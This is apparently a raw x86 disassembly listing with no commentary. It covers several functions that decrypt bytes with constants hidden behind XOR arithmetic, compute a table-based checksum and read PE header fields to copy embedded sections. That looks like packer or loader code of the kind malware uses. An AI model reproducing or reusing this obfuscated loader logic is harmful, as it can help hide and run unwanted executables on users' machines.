  4229df:	xor    esi,eax
  4229e1:	xor    ecx,eax
  4229e3:	sub    ecx,esi
  4229e5:	cmp    edi,ecx
  4229e7:	jbe    0x422993
  4229e9:	mov    eax,DWORD PTR [ebp-0x8]
  4229ec:	pop    edi
  4229ed:	mov    DWORD PTR [ebx],eax
  4229ef:	mov    eax,DWORD PTR [ebp-0x8]
  4229f2:	pop    esi
  4229f3:	leave  
  4229f4:	ret    
  4229f5:	push   ebp
  4229f6:	mov    ebp,esp
  4229f8:	sub    esp,0x38
  4229fb:	push   ebx
  4229fc:	mov    ebx,0xf89c85b5
  422a01:	mov    DWORD PTR [ebp-0x4],ebx
  422a04:	lea    ecx,[ebx-0x1]
  422a07:	mov    DWORD PTR [ebp-0x24],ecx
  422a0a:	mov    eax,DWORD PTR [ebp-0x4]
  422a0d:	mov    edx,DWORD PTR [ebp+0x8]
  422a10:	push   esi
  422a11:	mov    esi,0x75108b3
  422a16:	xor    eax,esi
  422a18:	push   edi
  422a19:	mov    edi,0x3272fa
  422a1e:	add    eax,edi
  422a20:	cmp    edx,eax
  422a22:	mov    eax,DWORD PTR [ebp-0x4]
  422a25:	je     0x422b8a
  422a2b:	mov    edx,DWORD PTR [ebp+0xc]
  422a2e:	xor    eax,esi
  422a30:	add    eax,edi
  422a32:	cmp    edx,eax
  422a34:	je     0x422b87
  422a3a:	mov    eax,DWORD PTR [ebp+0x10]
  422a3d:	mov    edx,DWORD PTR [ebp+0xc]
  422a40:	mov    DWORD PTR [ebp-0x14],eax
  422a43:	mov    eax,DWORD PTR [ebp+0x8]
  422a46:	mov    DWORD PTR [ebp-0x18],0xf89c8522
  422a4d:	mov    DWORD PTR [ebp-0xc],eax
  422a50:	lea    eax,[ebx+0x6]
  422a53:	mov    DWORD PTR [ebp-0x1c],eax
  422a56:	mov    DWORD PTR [ebp-0x10],ebx
  422a59:	mov    DWORD PTR [ebp+0xc],ecx
  422a5c:	mov    DWORD PTR [ebp+0x10],eax
  422a5f:	mov    eax,DWORD PTR [ebp+0xc]
  422a62:	xor    eax,esi
  422a64:	mov    DWORD PTR [ebp-0x20],edx
  422a67:	sub    edx,eax
  422a69:	sub    edx,edi
  422a6b:	mov    DWORD PTR [ebp+0x8],edx
  422a6e:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  422a75:	jmp    0x422b77
  422a7a:	mov    eax,DWORD PTR [ebp+0xc]
  422a7d:	mov    ecx,DWORD PTR [ebp+0xc]
  422a80:	xor    eax,esi
  422a82:	xor    ecx,esi
  422a84:	lea    ecx,[eax+ecx*1+0x64e5f4]
  422a8b:	mov    eax,DWORD PTR [ebp+0x8]
  422a8e:	xor    edx,edx
  422a90:	div    ecx
  422a92:	mov    eax,DWORD PTR [ebp+0x10]
  422a95:	mov    ecx,DWORD PTR [ebp+0xc]
  422a98:	xor    eax,esi
  422a9a:	xor    ecx,esi
  422a9c:	sub    eax,ecx
  422a9e:	cmp    edx,eax
  422aa0:	jne    0x422b36
  422aa6:	mov    eax,DWORD PTR [ebp+0x8]
  422aa9:	mov    ecx,DWORD PTR [ebp-0xc]
  422aac:	mov    dl,BYTE PTR [eax+ecx*1]
  422aaf:	mov    eax,DWORD PTR [ebp-0x10]
  422ab2:	mov    ecx,DWORD PTR [ebp-0x8]
  422ab5:	xor    eax,esi
  422ab7:	xor    ecx,esi
  422ab9:	add    eax,edi
  422abb:	add    ecx,edi
  422abd:	cmp    eax,ecx
  422abf:	jae    0x422b07
  422ac1:	lea    ecx,[eax-0x3272fa]
  422ac7:	mov    DWORD PTR [ebp-0x4],ecx
  422aca:	mov    ebx,DWORD PTR [ebp-0x4]
  422acd:	xor    ebx,esi
  422acf:	add    ebx,0x7f55d8fb
  422ad5:	lea    ecx,[ebp+eax*4-0x38]
  422ad9:	mov    DWORD PTR [ecx],ebx
  422adb:	mov    ebx,DWORD PTR [ecx]
  422add:	cmp    ebx,0x244ecb9a
  422ae3:	jbe    0x422aed
  422ae5:	add    DWORD PTR [ecx],0x405fcd9
  422aeb:	jmp    0x422af3
  422aed:	add    DWORD PTR [ecx],0xfdaf4327
  422af3:	mov    ecx,DWORD PTR [ebp-0x8]
  422af6:	xor    ecx,esi
  422af8:	inc    eax
  422af9:	inc    DWORD PTR [ebp-0x4]
  422afc:	add    ecx,edi
  422afe:	cmp    eax,ecx
  422b00:	jb     0x422aca
  422b02:	mov    ebx,0xf89c85b5
  422b07:	cmp    DWORD PTR [ebp-0x14],0x0
  422b0b:	jne    0x422b15
  422b0d:	xor    dl,0x81
  422b10:	add    dl,0x6
  422b13:	jmp    0x422b2b
  422b15:	mov    eax,DWORD PTR [ebp-0x18]
  422b18:	xor    al,0xb3
  422b1a:	mov    cl,0x6
  422b1c:	sub    cl,al
  422b1e:	add    dl,cl
  422b20:	mov    ecx,DWORD PTR [ebp-0x1c]
  422b23:	xor    cl,0xb3
  422b26:	sub    cl,0x6
  422b29:	ror    dl,cl
  422b2b:	xor    eax,eax
  422b2d:	mov    eax,DWORD PTR [ebp+0x8]
  422b30:	mov    ecx,DWORD PTR [ebp-0xc]
  422b33:	mov    BYTE PTR [eax+ecx*1],dl
  422b36:	mov    eax,DWORD PTR [ebp+0x8]
  422b39:	mov    ecx,DWORD PTR [ebp-0x10]
  422b3c:	sub    eax,edi
  422b3e:	xor    eax,esi
  422b40:	cmp    eax,ecx
  422b42:	jne    0x422b65
  422b44:	mov    eax,DWORD PTR [ebp+0x10]
  422b47:	mov    ecx,DWORD PTR [ebp+0xc]
  422b4a:	xor    eax,esi
  422b4c:	xor    ecx,esi
  422b4e:	sub    eax,ecx
  422b50:	mov    ecx,DWORD PTR [ebp-0x20]
  422b53:	sub    eax,edi
  422b55:	xor    eax,esi
  422b57:	mov    DWORD PTR [ebp+0x10],eax
  422b5a:	mov    eax,DWORD PTR [ebp+0xc]
  422b5d:	xor    eax,esi
  422b5f:	sub    ecx,eax
  422b61:	sub    ecx,edi
  422b63:	jmp    0x422b74
  422b65:	mov    eax,DWORD PTR [ebp+0xc]
  422b68:	xor    eax,esi
  422b6a:	mov    ecx,0xffcd8d06
  422b6f:	sub    ecx,eax
  422b71:	add    ecx,DWORD PTR [ebp+0x8]
  422b74:	mov    DWORD PTR [ebp+0x8],ecx
  422b77:	mov    eax,DWORD PTR [ebp+0x10]
  422b7a:	cmp    eax,ebx
  422b7c:	jne    0x422a7a
  422b82:	mov    eax,DWORD PTR [ebp-0x24]
  422b85:	jmp    0x422b8a
  422b87:	mov    eax,DWORD PTR [ebp-0x4]
  422b8a:	xor    eax,esi
  422b8c:	add    eax,edi
  422b8e:	pop    edi
  422b8f:	pop    esi
  422b90:	pop    ebx
  422b91:	leave  
  422b92:	ret    0xc
  422b95:	push   ebp
  422b96:	mov    ebp,esp
  422b98:	sub    esp,0x420
  422b9e:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  422ba5:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  422bac:	mov    DWORD PTR [ebp-0x18],0xf89c86b5
  422bb3:	push   ebx
  422bb4:	mov    DWORD PTR [ebp-0x1c],0xf89c85b6
  422bbb:	mov    eax,DWORD PTR [ebp-0x14]
  422bbe:	push   esi
  422bbf:	mov    esi,0x75108b3
  422bc4:	push   edi
  422bc5:	xor    eax,esi
  422bc7:	mov    edi,0x3272fa
  422bcc:	add    eax,edi
  422bce:	mov    DWORD PTR [ebp-0x8],eax
  422bd1:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  422bd8:	mov    DWORD PTR [ebp-0x4],0xead71895
  422bdf:	mov    DWORD PTR [ebp-0x10],0x8
  422be6:	mov    ecx,ecx
  422be8:	mov    eax,DWORD PTR [ebp-0xc]
  422beb:	mov    ecx,DWORD PTR [ebp-0x14]
  422bee:	xor    eax,esi
  422bf0:	xor    ecx,esi
  422bf2:	add    eax,edi
  422bf4:	add    ecx,edi
  422bf6:	imul   eax,ecx
  422bf9:	jmp    0x422c2c
  422bfb:	mov    eax,DWORD PTR [ebp-0x4]
  422bfe:	sub    eax,edi
  422c00:	xor    eax,esi
  422c02:	mov    DWORD PTR [ebp-0x8],eax
  422c05:	lea    ebx,[ebp-0x8]
  422c08:	call   0x42294d
  422c0d:	mov    DWORD PTR [ebp-0x8],eax
  422c10:	mov    eax,DWORD PTR [ebp-0x8]
  422c13:	mov    ecx,DWORD PTR [ebp-0x4]
  422c16:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  422c1d:	mov    eax,DWORD PTR [ebp-0xc]
  422c20:	mov    ecx,DWORD PTR [ebp-0x4]
  422c23:	xor    eax,esi
  422c25:	lea    eax,[eax+ecx*1+0x3272fa]
  422c2c:	mov    DWORD PTR [ebp-0x4],eax
  422c2f:	mov    eax,DWORD PTR [ebp-0x18]
  422c32:	mov    ecx,DWORD PTR [ebp-0xc]
  422c35:	xor    ecx,esi
  422c37:	xor    eax,esi
  422c39:	sub    eax,ecx
  422c3b:	mov    ecx,DWORD PTR [ebp-0x4]
  422c3e:	cmp    ecx,eax
  422c40:	jbe    0x422bfb
  422c42:	mov    eax,DWORD PTR [ebp-0x1c]
  422c45:	xor    eax,esi
  422c47:	add    eax,edi
  422c49:	mov    DWORD PTR [ebp-0x8],eax
  422c4c:	mov    DWORD PTR [ebp-0x18],0xf89c86b6
  422c53:	mov    ebx,ebx
  422c55:	jmp    0x422cb8
  422c57:	mov    ecx,DWORD PTR [ebp-0x20]
  422c5a:	mov    eax,DWORD PTR [ebp-0x8]
  422c5d:	xor    ecx,esi
  422c5f:	add    ecx,edi
  422c61:	shr    eax,cl
  422c63:	mov    DWORD PTR [ebp-0x4],eax
  422c66:	mov    eax,DWORD PTR [ebp+0x8]
  422c69:	mov    cl,BYTE PTR [eax]
  422c6b:	mov    BYTE PTR [ebp+0xb],cl
  422c6e:	mov    cl,BYTE PTR [ebp+0xb]
  422c71:	mov    edx,DWORD PTR [ebp-0x8]
  422c74:	movzx  ecx,cl
  422c77:	xor    ecx,edx
  422c79:	mov    DWORD PTR [ebp+0x8],ecx
  422c7c:	mov    ecx,DWORD PTR [ebp-0x18]
  422c7f:	mov    edx,DWORD PTR [ebp+0x8]
  422c82:	xor    ecx,esi
  422c84:	add    ecx,edi
  422c86:	and    ecx,edx
  422c88:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  422c8f:	mov    edx,DWORD PTR [ebp-0x4]
  422c92:	xor    ecx,edx
  422c94:	mov    DWORD PTR [ebp-0x8],ecx
  422c97:	mov    ecx,DWORD PTR [ebp-0xc]
  422c9a:	xor    ecx,esi
  422c9c:	lea    eax,[eax+ecx*1+0x3272fa]
  422ca3:	mov    DWORD PTR [ebp+0x8],eax
  422ca6:	mov    eax,DWORD PTR [ebp-0xc]
  422ca9:	xor    eax,esi
  422cab:	mov    ecx,0xffcd8d06
  422cb0:	sub    ecx,eax
  422cb2:	add    ecx,DWORD PTR [ebp-0x10]
  422cb5:	mov    DWORD PTR [ebp-0x10],ecx
  422cb8:	mov    eax,DWORD PTR [ebp-0x14]
  422cbb:	mov    ecx,DWORD PTR [ebp-0x10]
  422cbe:	xor    eax,esi
  422cc0:	add    eax,edi
  422cc2:	cmp    ecx,eax
  422cc4:	jne    0x422c57
  422cc6:	mov    eax,DWORD PTR [ebp-0x1c]
  422cc9:	mov    ecx,DWORD PTR [ebp-0x8]
  422ccc:	xor    eax,esi
  422cce:	add    eax,edi
  422cd0:	pop    edi
  422cd1:	pop    esi
  422cd2:	xor    eax,ecx
  422cd4:	pop    ebx
  422cd5:	leave  
  422cd6:	ret    0x4
  422cd9:	push   ebp
  422cda:	mov    ebp,esp
  422cdc:	mov    eax,DWORD PTR [ebp+0x1c]
  422cdf:	mov    ecx,DWORD PTR [ebp+0x8]
  422ce2:	mov    edx,DWORD PTR [ebp+0x10]
  422ce5:	mov    eax,DWORD PTR [eax+0x190]
  422ceb:	mov    eax,DWORD PTR [eax]
  422ced:	sub    esp,0x64
  422cf0:	push   ebx
  422cf1:	push   esi
  422cf2:	push   edi
  422cf3:	mov    edi,0x75108b3
  422cf8:	xor    ecx,edi
  422cfa:	mov    ebx,0x3272fa
  422cff:	add    ecx,ebx
  422d01:	cmp    ecx,edx
  422d03:	jne    0x422d14
  422d05:	or     DWORD PTR ds:0x3750c3f,0x4263ebce
  422d0f:	jmp    0x423210
  422d14:	mov    ecx,DWORD PTR [ebp+0x8]
  422d17:	mov    esi,DWORD PTR [ebp+0x14]
  422d1a:	mov    edx,DWORD PTR [esi]
  422d1c:	xor    ecx,edi
  422d1e:	add    ecx,ebx
  422d20:	cmp    edx,ecx
  422d22:	je     0x4231cb
  422d28:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d2b:	mov    DWORD PTR [ebp-0x1c],eax
  422d2e:	mov    DWORD PTR [ebp+0x1c],ecx
  422d31:	mov    ecx,DWORD PTR [ebp+0x18]
  422d34:	mov    eax,DWORD PTR [esi]
  422d36:	mov    DWORD PTR [ebp-0x20],eax
  422d39:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  422d40:	mov    edx,0xf89c85b4
  422d45:	mov    DWORD PTR [ebp-0x8],edx
  422d48:	mov    eax,DWORD PTR [ebp+0x1c]
  422d4b:	mov    DWORD PTR [ebp+0x1c],eax
  422d4e:	mov    eax,DWORD PTR [ebp+0x1c]
  422d51:	mov    eax,DWORD PTR [eax+0x190]
  422d57:	mov    eax,DWORD PTR [eax]
  422d59:	mov    DWORD PTR [ebp-0x24],ecx
  422d5c:	mov    ecx,DWORD PTR [ebp+0x1c]
  422d5f:	mov    ecx,DWORD PTR [ecx+0x190]
  422d65:	mov    ecx,DWORD PTR [ecx]
  422d67:	add    ecx,DWORD PTR [eax+0x3c]
  422d6a:	mov    DWORD PTR [ebp+0x10],ecx
  422d6d:	mov    eax,DWORD PTR [ebp+0x8]
  422d70:	xor    eax,edi
  422d72:	add    eax,ebx
  422d74:	mov    DWORD PTR [ebp-0x4],eax
  422d77:	mov    eax,DWORD PTR [ebp+0x8]
  422d7a:	xor    eax,edi
  422d7c:	add    eax,ebx
  422d7e:	mov    DWORD PTR [ebp+0x18],eax
  422d81:	mov    eax,DWORD PTR [ebp+0x10]
  422d84:	mov    eax,DWORD PTR [eax+0x50]
  422d87:	sub    eax,0xc
  422d8a:	mov    DWORD PTR [ebp-0x28],eax
  422d8d:	mov    eax,DWORD PTR [ebp+0x10]
  422d90:	mov    eax,DWORD PTR [eax+0x38]
  422d93:	mov    ecx,DWORD PTR [ebp+0x10]
  422d96:	dec    eax
  422d97:	test   DWORD PTR [ecx+0x54],eax
  422d9a:	mov    eax,DWORD PTR [ebp+0x10]
  422d9d:	je     0x422db7
  422d9f:	mov    eax,DWORD PTR [eax+0x38]
  422da2:	mov    ecx,DWORD PTR [ebp+0x10]
  422da5:	mov    ecx,DWORD PTR [ecx+0x54]
  422da8:	dec    eax
  422da9:	not    eax
  422dab:	and    ecx,eax
  422dad:	mov    eax,DWORD PTR [ebp+0x10]
  422db0:	mov    eax,DWORD PTR [eax+0x38]
  422db3:	add    eax,ecx
  422db5:	jmp    0x422dba
  422db7:	mov    eax,DWORD PTR [eax+0x54]
  422dba:	mov    DWORD PTR [ebp+0x1c],eax
  422dbd:	mov    eax,DWORD PTR [ebp+0x8]
  422dc0:	xor    eax,edi
  422dc2:	add    eax,ebx
  422dc4:	mov    DWORD PTR [ebp+0x18],eax
  422dc7:	mov    eax,DWORD PTR [ebp+0x8]
  422dca:	xor    eax,edi
  422dcc:	add    eax,ebx
  422dce:	mov    DWORD PTR [ebp+0x18],eax
  422dd1:	mov    eax,DWORD PTR [ebp+0x8]
  422dd4:	mov    ecx,DWORD PTR [ebp-0x24]
  422dd7:	xor    eax,edi
  422dd9:	add    eax,ebx
  422ddb:	mov    DWORD PTR [ecx],eax
  422ddd:	mov    DWORD PTR [ebp+0x18],edx
  422de0:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  422de7:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  422dee:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  422df5:	mov    eax,DWORD PTR [ebp-0x8]
  422df8:	mov    ecx,DWORD PTR [ebp+0x1c]
  422dfb:	xor    eax,edi
  422dfd:	add    eax,ebx
  422dff:	imul   eax,ecx
  422e02:	mov    ecx,DWORD PTR [ebp+0x8]
  422e05:	mov    edx,DWORD PTR [ebp-0x28]
  422e08:	xor    ecx,edi
  422e0a:	lea    ecx,[ecx+edx*1+0x3272fa]
  422e11:	cmp    eax,ecx
  422e13:	jae    0x4231c4
  422e19:	mov    eax,DWORD PTR [ebp+0x8]
  422e1c:	xor    eax,edi
  422e1e:	add    eax,ebx
  422e20:	mov    DWORD PTR [ebp+0x18],eax
  422e23:	mov    eax,DWORD PTR [ebp+0x1c]
  422e26:	add    eax,DWORD PTR [ebp-0x1c]
  422e29:	mov    DWORD PTR [ebp-0x4],eax
  422e2c:	push   DWORD PTR [ebp-0x4]
  422e2f:	mov    esi,DWORD PTR [ebp-0x1c]
  422e32:	mov    ecx,DWORD PTR [ebp+0x10]
  422e35:	call   0x421f85
  422e3a:	mov    DWORD PTR [ebp+0xc],eax
  422e3d:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  422e44:	mov    eax,DWORD PTR [ebp-0x18]
  422e47:	xor    eax,edi
  422e49:	lea    ecx,[ebp-0x40]
  422e4c:	add    eax,ebx
  422e4e:	push   ecx
  422e4f:	call   0x422519
  422e54:	mov    eax,DWORD PTR [ebp+0xc]
  422e57:	test   eax,eax
  422e59:	je     0x422ea9
  422e5b:	mov    eax,DWORD PTR [ebp-0x18]
  422e5e:	xor    eax,edi
  422e60:	add    eax,ebx
  422e62:	push   eax
  422e63:	push   DWORD PTR [ebp+0xc]
  422e66:	lea    eax,[ebp-0x40]
  422e69:	push   eax
  422e6a:	call   0x42240f
  422e6f:	mov    eax,DWORD PTR [ebp-0x4]
  422e72:	mov    DWORD PTR [ebp-0x18],eax
  422e75:	mov    eax,DWORD PTR [ebp-0x18]
  422e78:	mov    ecx,DWORD PTR [ebp-0x1c]
  422e7b:	sub    eax,ecx
  422e7d:	mov    DWORD PTR [ebp-0x18],eax
  422e80:	mov    eax,DWORD PTR [ebp+0xc]
  422e83:	mov    ecx,DWORD PTR [ebp+0xc]
  422e86:	mov    eax,DWORD PTR [eax+0x10]
  422e89:	add    eax,DWORD PTR [ecx+0xc]
  422e8c:	mov    ecx,DWORD PTR [ebp-0x18]
  422e8f:	cmp    ecx,eax
  422e91:	jb     0x422ea9
  422e93:	mov    eax,DWORD PTR [ebp+0xc]
  422e96:	mov    eax,DWORD PTR [eax+0xc]
  422e99:	mov    ecx,DWORD PTR [ebp+0xc]
  422e9c:	add    eax,DWORD PTR [ecx+0x8]
  422e9f:	mov    ecx,DWORD PTR [ebp-0x18]
  422ea2:	sub    eax,ecx
  422ea4:	jmp    0x423197
  422ea9:	push   0xc
  422eab:	push   DWORD PTR [ebp-0x4]
  422eae:	lea    eax,[ebp-0x4c]
  422eb1:	push   eax
  422eb2:	call   0x42240f
  422eb7:	mov    eax,0xf89c85b5
  422ebc:	mov    DWORD PTR [ebp-0x2c],eax
  422ebf:	mov    DWORD PTR [ebp-0x30],0xf89c85b4
  422ec6:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  422ecd:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  422ed4:	lea    ecx,[ebp-0x2c]
  422ed7:	mov    DWORD PTR [ebp-0xc],ecx
  422eda:	lea    ecx,[ebp-0x30]
  422edd:	mov    DWORD PTR [ebp-0x10],ecx
  422ee0:	lea    ecx,[ebp-0x34]
  422ee3:	mov    DWORD PTR [ebp+0xc],ecx
  422ee6:	lea    ecx,[ebp-0x38]
  422ee9:	mov    DWORD PTR [ebp-0x14],ecx
  422eec:	mov    ecx,DWORD PTR [ebp+0x8]
  422eef:	xor    ecx,edi
  422ef1:	add    ecx,ebx
  422ef3:	mov    DWORD PTR [ebp-0x18],ecx
  422ef6:	jmp    0x4230f2
  422efb:	cmp    eax,0xf89c85bb
  422f00:	je     0x423104
  422f06:	mov    ecx,DWORD PTR [ebp-0x8]
  422f09:	xor    ecx,edi
  422f0b:	mov    esi,eax
  422f0d:	add    ecx,ebx
  422f0f:	mov    DWORD PTR [ebp+0x18],ecx
  422f12:	mov    eax,DWORD PTR [ebp-0x18]
  422f15:	xor    esi,edi
  422f17:	lea    eax,[eax+esi*1+0x3272fa]
  422f1e:	mov    DWORD PTR [ebp-0x18],eax
  422f21:	mov    eax,DWORD PTR [ebp-0x8]
  422f24:	mov    ecx,DWORD PTR [ebp-0x18]
  422f27:	xor    eax,edi
  422f29:	add    eax,ebx
  422f2b:	cmp    ecx,eax
  422f2d:	jne    0x422f42
  422f2f:	mov    eax,DWORD PTR [ebp+0x8]
  422f32:	xor    eax,edi
  422f34:	add    eax,ebx
  422f36:	push   eax
  422f37:	push   0xc
  422f39:	lea    eax,[ebp-0x4c]
  422f3c:	push   eax
  422f3d:	call   0x4229f5
  422f42:	mov    eax,DWORD PTR [ebp-0xc]
  422f45:	mov    eax,DWORD PTR [eax]
  422f47:	xor    eax,edi
  422f49:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f50:	mov    ecx,DWORD PTR [ebp+0x8]
  422f53:	xor    ecx,edi
  422f55:	movzx  eax,al
  422f58:	add    ecx,ebx
  422f5a:	cmp    eax,ecx
  422f5c:	je     0x4230da
  422f62:	mov    eax,DWORD PTR [ebp-0x10]
  422f65:	mov    eax,DWORD PTR [eax]
  422f67:	xor    eax,edi
  422f69:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f70:	mov    ecx,DWORD PTR [ebp+0x8]
  422f73:	xor    ecx,edi
  422f75:	movzx  eax,al
  422f78:	add    ecx,ebx
  422f7a:	cmp    eax,ecx
  422f7c:	je     0x4230da
  422f82:	mov    eax,DWORD PTR [ebp+0xc]
  422f85:	mov    eax,DWORD PTR [eax]
  422f87:	xor    eax,edi
  422f89:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f90:	mov    ecx,DWORD PTR [ebp+0x8]
  422f93:	xor    ecx,edi
  422f95:	movzx  eax,al
  422f98:	add    ecx,ebx
  422f9a:	cmp    eax,ecx
  422f9c:	je     0x4230da
  422fa2:	mov    eax,DWORD PTR [ebp-0x14]
  422fa5:	mov    eax,DWORD PTR [eax]
  422fa7:	xor    eax,edi
  422fa9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fb0:	mov    ecx,DWORD PTR [ebp+0x8]
  422fb3:	xor    ecx,edi
  422fb5:	movzx  eax,al
  422fb8:	add    ecx,ebx
  422fba:	cmp    eax,ecx
  422fbc:	je     0x4230da
  422fc2:	mov    eax,DWORD PTR [ebp-0x10]
  422fc5:	mov    eax,DWORD PTR [eax]
  422fc7:	xor    eax,edi
  422fc9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fd0:	mov    ecx,DWORD PTR [ebp-0xc]
  422fd3:	mov    ecx,DWORD PTR [ecx]
  422fd5:	xor    ecx,edi
  422fd7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fde:	xor    al,cl
  422fe0:	mov    ecx,DWORD PTR [ebp+0xc]
  422fe3:	mov    ecx,DWORD PTR [ecx]
  422fe5:	xor    ecx,edi
  422fe7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fee:	or     al,cl
  422ff0:	mov    ecx,DWORD PTR [ebp-0xc]
  422ff3:	mov    ecx,DWORD PTR [ecx]
  422ff5:	xor    ecx,edi
  422ff7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  422ffe:	cmp    cl,al
  423000:	jne    0x4230da
  423006:	mov    eax,DWORD PTR [ebp+0xc]
  423009:	mov    eax,DWORD PTR [eax]
  42300b:	xor    eax,edi
  42300d:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423014:	mov    ecx,DWORD PTR [ebp-0x10]
  423017:	mov    ecx,DWORD PTR [ecx]
  423019:	xor    ecx,edi
  42301b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423022:	xor    al,cl
  423024:	mov    ecx,DWORD PTR [ebp-0x14]
  423027:	mov    ecx,DWORD PTR [ecx]
  423029:	xor    ecx,edi
  42302b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423032:	or     al,cl
  423034:	mov    ecx,DWORD PTR [ebp-0x10]
  423037:	mov    ecx,DWORD PTR [ecx]
  423039:	xor    ecx,edi
  42303b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423042:	cmp    cl,al
  423044:	jne    0x4230da
  42304a:	mov    eax,DWORD PTR [ebp-0x14]
  42304d:	mov    eax,DWORD PTR [eax]
  42304f:	xor    eax,edi
  423051:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423058:	mov    ecx,DWORD PTR [ebp+0xc]
  42305b:	mov    ecx,DWORD PTR [ecx]
  42305d:	xor    ecx,edi
  42305f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423066:	xor    al,cl
  423068:	mov    ecx,DWORD PTR [ebp-0xc]
  42306b:	mov    ecx,DWORD PTR [ecx]
  42306d:	xor    ecx,edi
  42306f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423076:	or     al,cl
  423078:	mov    ecx,DWORD PTR [ebp+0xc]
  42307b:	mov    ecx,DWORD PTR [ecx]
  42307d:	xor    ecx,edi
  42307f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423086:	cmp    cl,al
  423088:	jne    0x4230da
  42308a:	mov    eax,DWORD PTR [ebp-0x14]
  42308d:	mov    eax,DWORD PTR [eax]
  42308f:	xor    eax,edi
  423091:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423098:	mov    ecx,DWORD PTR [ebp-0xc]
  42309b:	mov    ecx,DWORD PTR [ecx]
  42309d:	xor    ecx,edi
  42309f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230a6:	xor    al,cl
  4230a8:	mov    ecx,DWORD PTR [ebp-0x10]
  4230ab:	mov    ecx,DWORD PTR [ecx]
  4230ad:	xor    ecx,edi
  4230af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230b6:	or     al,cl
  4230b8:	mov    ecx,DWORD PTR [ebp-0x14]
  4230bb:	mov    ecx,DWORD PTR [ecx]
  4230bd:	xor    ecx,edi
  4230bf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  4230c6:	cmp    cl,al
  4230c8:	jne    0x4230da
  4230ca:	lea    eax,[ebp-0x4c]
  4230cd:	push   eax
  4230ce:	call   0x422b95
  4230d3:	mov    ecx,DWORD PTR [ebp-0x44]
  4230d6:	cmp    eax,ecx
  4230d8:	je     0x4230e4
  4230da:	mov    eax,DWORD PTR [ebp+0x8]
  4230dd:	xor    eax,edi
  4230df:	add    eax,ebx
  4230e1:	mov    DWORD PTR [ebp+0x18],eax
  4230e4:	mov    eax,DWORD PTR [ebp-0x8]
  4230e7:	xor    eax,edi
  4230e9:	lea    eax,[eax+esi*1+0x3272fa]
  4230f0:	xor    eax,edi
  4230f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4230f5:	mov    edx,DWORD PTR [ebp+0x18]
  4230f8:	xor    ecx,edi
  4230fa:	add    ecx,ebx
  4230fc:	cmp    edx,ecx
  4230fe:	je     0x422efb
  423104:	mov    eax,DWORD PTR [ebp+0x8]
  423107:	mov    ecx,DWORD PTR [ebp+0x18]
  42310a:	xor    eax,edi
  42310c:	add    eax,ebx
  42310e:	cmp    ecx,eax
  423110:	jne    0x423123
  423112:	mov    eax,DWORD PTR [ebp-0x8]
  423115:	mov    ecx,DWORD PTR [ebp+0x1c]
  423118:	xor    eax,edi
  42311a:	lea    eax,[eax+ecx*1+0x3272fa]
  423121:	jmp    0x42319a
  423123:	push   0x18
  423125:	push   DWORD PTR [ebp-0x4]
  423128:	lea    eax,[ebp-0x64]
  42312b:	push   eax
  42312c:	call   0x42240f
  423131:	mov    eax,DWORD PTR [ebp+0x8]
  423134:	mov    ecx,DWORD PTR [ebp-0x18]
  423137:	xor    eax,edi
  423139:	add    eax,ebx
  42313b:	cmp    eax,ecx
  42313d:	je     0x423152
  42313f:	mov    eax,DWORD PTR [ebp+0x8]
  423142:	xor    eax,edi
  423144:	add    eax,ebx
  423146:	push   eax
  423147:	push   0x18
  423149:	lea    eax,[ebp-0x64]
  42314c:	push   eax
  42314d:	call   0x4229f5
  423152:	mov    eax,DWORD PTR [ebp-0x4]
  423155:	add    eax,0x18
  423158:	mov    DWORD PTR [ebp+0x18],eax
  42315b:	push   DWORD PTR [ebp-0x50]
  42315e:	push   DWORD PTR [ebp+0x18]
  423161:	mov    eax,DWORD PTR [ebp-0x54]
  423164:	add    eax,DWORD PTR [ebp-0x20]
  423167:	push   eax
  423168:	call   0x42240f
  42316d:	mov    eax,DWORD PTR [ebp+0x8]
  423170:	mov    ecx,DWORD PTR [ebp-0x18]
  423173:	xor    eax,edi
  423175:	add    eax,ebx
  423177:	cmp    eax,ecx
  423179:	je     0x42318c
  42317b:	push   0x0
  42317d:	push   DWORD PTR [ebp-0x50]
  423180:	mov    eax,DWORD PTR [ebp-0x54]
  423183:	add    eax,DWORD PTR [ebp-0x20]
  423186:	push   eax
  423187:	call   0x4229f5
  42318c:	mov    eax,DWORD PTR [ebp-0x24]
  42318f:	mov    ecx,DWORD PTR [ebp-0x50]
  423192:	add    DWORD PTR [eax],ecx
  423194:	mov    eax,DWORD PTR [ebp-0x50]
  423197:	add    eax,DWORD PTR [ebp+0x1c]
  42319a:	mov    DWORD PTR [ebp+0x1c],eax
